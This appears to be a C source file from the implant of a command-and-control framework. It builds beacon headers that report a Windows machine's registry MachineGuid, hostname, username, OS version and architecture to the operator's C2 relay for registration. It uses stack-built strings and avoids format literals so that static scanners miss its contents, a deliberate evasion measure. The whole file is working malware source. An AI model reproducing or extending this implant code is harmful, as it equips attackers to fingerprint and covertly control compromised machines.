/* identity_headers.c - see identity_headers.h.
 *
 * One writer, one pass: every piece is either a stack-built fixed string
 * (stackstrings.h) or a dynamic ASCII value from system_facts, appended
 * as label+value+CRLF. The MachineGuid registry TEXT is read raw: it must
 * be the plain "xxxxxxxx-xxxx-..." string exactly as C# Guid.ToString()
 * prints it (which is exactly what the registry stores) - the .NET Guid
 * byte reorder get_machine_uuid applies is for binary frames, not headers.
 */

#include "identity_headers.h"
#include "stackstrings.h"
#include "string.h"
#include "memory.h"
#include "peb.h"
#include "ntdll.h"
#include "kernel32.h"
#include "advapi.h"
#include "wintypes.h"
#include "system.h"

/* --- tiny checked writer: every append fails to NULL on overflow ------ */

typedef struct {
    CHAR *cur;
    CHAR *end;   /* one past the last writable byte */
    int   ok;
} hwriter;

static void hw_putc(hwriter *w, CHAR c)
{
    if (!w->ok || w->cur >= w->end) { w->ok = 0; return; }
    *w->cur++ = c;
}

static void hw_puts(hwriter *w, const CHAR *s)
{
    while (*s != '\0') hw_putc(w, *s++);
}

static void hw_crlf(hwriter *w)
{
    hw_putc(w, '\r');
    hw_putc(w, '\n');
}

/* One whole header line: label + value + CRLF. */
static void hw_header(hwriter *w, const CHAR *label, const CHAR *value)
{
    hw_puts(w, label);
    hw_puts(w, value);
    hw_crlf(w);
}

/* --- machine facts ----------------------------------------------------- */

/* Read the MachineGuid registry TEXT into guid_text (registry order ==
 * Guid.ToString() order); returns 0 on failure (guid_text[0] = 0). */
static int read_machine_guid_text(CHAR guid_text[40])
{
    guid_text[0] = '\0';

    ADVAPI advapi;
    HKEY key = NULL;
    if (!ADVAPI_Ctor(&advapi))
        return 0;

    CHAR regpath[37];
    StrRegPath(regpath);
    CHAR guidname[12];
    StrMachineGuid(guidname);

    DWORD size = 39; /* 36 chars + NUL */
    if (advapi.RegOpenKeyExA(HKEY_LOCAL_MACHINE, regpath, 0,
                             KEY_QUERY_VALUE, &key) != ERROR_SUCCESS)
        return 0;

    DWORD type = 0;
    BOOL ok = advapi.RegQueryValueExA(key, guidname, NULL, &type,
                                      (unsigned char *)guid_text,
                                      &size) == ERROR_SUCCESS
              && type == REG_SZ;
    advapi.RegCloseKey(key);
    return ok && guid_text[0] != '\0' ? 1 : 0;
}

/* Write "value" in decimal (a format literal would sit in .rdata). */
static void hw_u32_decimal(hwriter *w, UINT32 value)
{
    CHAR rev[10];
    INT32 n = 0;
    do {
        rev[n++] = (CHAR)((value % 10) + '0');
        value /= 10;
    } while (value != 0);
    while (n > 0)
        hw_putc(w, rev[--n]);
}

/* --- the block ---------------------------------------------------------- */

USIZE build_identity_headers(CHAR headers[IDENTITY_HEADERS_SIZE])
{
    hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
    CHAR piece[64];

    /* Fixed lines first: api version, breed, platform, capability mask. */
    StrHdrApiVersion(piece);  hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrNameId(piece);      hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrPlatform(piece);    hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrCaps(piece);        hw_puts(&w, piece);  hw_crlf(&w);

    /* Machine UUID - THE registration key. Optional header: when the
     * registry read fails the agent is identity-less (visible on the
     * relay, never registered by the C2) - the connect still proceeds. */
    CHAR guid_text[40];
    if (read_machine_guid_text(guid_text)) {
        StrLblUuid(piece);
        hw_header(&w, piece, guid_text);
    }

    /* Machine facts (hostname/user/OS from one collection pass). Every
     * dynamic header is optional - an empty value omits the line. */
    system_facts facts;
    collect_system_facts(&facts);

    StrLblHostname(piece);
    if (facts.hostname[0] != '\0')
        hw_header(&w, piece, facts.hostname);

    StrLblUsername(piece);
    if (facts.username[0] != '\0')
        hw_header(&w, piece, facts.username);

    /* Architecture pair (compile-time; matches the CI matrix triples). */
#if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) || defined(_M_X64)
    StrValArchX64(piece);
#elif defined(ENVIRONMENT_ARM64) || defined(__aarch64__) || defined(_M_ARM64)
    StrValArchArm64(piece);
#else
    StrValArchI386(piece);
#endif
    hw_puts(&w, piece);  hw_crlf(&w);

    StrLblOsVersion(piece);
    if (facts.os_version[0] != '\0')
        hw_header(&w, piece, facts.os_version);

    /* Build number + commit tag (display-only). */
    StrLblBuild(piece);
    hw_puts(&w, piece);
    hw_u32_decimal(&w, (UINT32)ID_BUILD_NUMBER);
    hw_crlf(&w);

    StrLblCommit(piece);
    StrCommitDefault(piece + 32);            /* two pieces in one buffer */
    hw_header(&w, piece, piece + 32);

    if (!w.ok)
        return 0;

    /* Room for the final NUL (WinHttpSendRequest takes WCHAR + length, so
     * the caller converts; the byte block itself needs no NUL, but keep
     * one so the block is printable in dev logs). */
    if (w.cur >= w.end)
        return 0;
    *w.cur = '\0';
    return (USIZE)(w.cur - headers);
}
